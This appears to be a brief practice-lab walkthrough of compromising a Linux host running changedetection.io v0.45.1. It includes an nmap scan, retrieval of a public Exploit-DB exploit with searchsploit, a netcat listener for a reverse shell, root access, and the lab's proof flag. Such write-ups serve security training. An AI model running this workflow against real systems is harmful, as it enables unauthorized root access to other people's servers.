# Linux - Detection

---

## Host Info - 192.168.117.97 - Linux

- Scan
    
    ```bash
    > nmap -sCV -A -Pn -O -p- 192.168.117.97 -oN tcpnmap.md
    
    PORT     STATE SERVICE VERSION
    22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey: 
    |   3072 62:36:1a:5c:d3:e3:7b:e1:70:f8:a3:b3:1c:4c:24:38 (RSA)
    |   256 ee:25:fc:23:66:05:c0:c1:ec:47:c6:bb:00:c7:4f:53 (ECDSA)
    |_  256 83:5c:51:ac:32:e5:3a:21:7c:f6:c2:cd:93:68:58:d8 (ED25519)
    5000/tcp open  http    Python http.server 3.5 - 3.10
    |_http-title: Change Detection
    
    Device type: general purpose|router
    Running: Linux 5.X, MikroTik RouterOS 7.X
    OS CPE: cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
    OS details: Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
    Network Distance: 4 hops
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
    
    > sudo nmap -sU -Pn <IP> --top-ports=100 --reason -oN udpnmap.md
    ```
    

---

## Walkthrough

- `5000` → `CHANGEDETECTION.IO v 0.45.1`
    
    ![image.png](Linux%20-%20Detection%20176553bebf0f80a88432dc6575ef4d5e/image.png)
    

```bash
# Google -> [link](https://www.exploit-db.com/exploits/52027)
> searchsploit -m 52027.py

> rlwrap nc -lvnp 9090
> whoami -> root

- Proof.txt : 620133072cccd2bafdcbafdaea8aaed5
```

- Exploit + PE
    
    ![image.png](Linux%20-%20Detection%20176553bebf0f80a88432dc6575ef4d5e/image%201.png)
    
    ![image.png](Linux%20-%20Detection%20176553bebf0f80a88432dc6575ef4d5e/image%202.png)